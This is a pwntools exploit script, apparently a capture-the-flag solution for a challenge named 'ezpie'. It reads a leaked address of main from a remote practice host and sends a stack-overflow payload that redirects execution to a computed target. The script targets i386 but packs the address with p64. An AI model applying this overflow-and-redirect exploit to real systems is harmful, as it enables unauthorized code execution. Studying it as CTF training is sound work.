from pwn import *

context.update(arch="i386", os="linux")
context.terminal = ["qterminal", "-e"]
context.log_level = "debug"
#p = process("./ezpie")
p=remote('node5.anna.nssctf.cn',28294)
p.recvuntil("0x")
main_addr = int(p.recv(8), 16)
target = main_addr + 160
payload = b"a" * 40 + b"b" * 4 + p64(target)
sleep(0.2)
pause()
p.send(payload)
p.interactive()
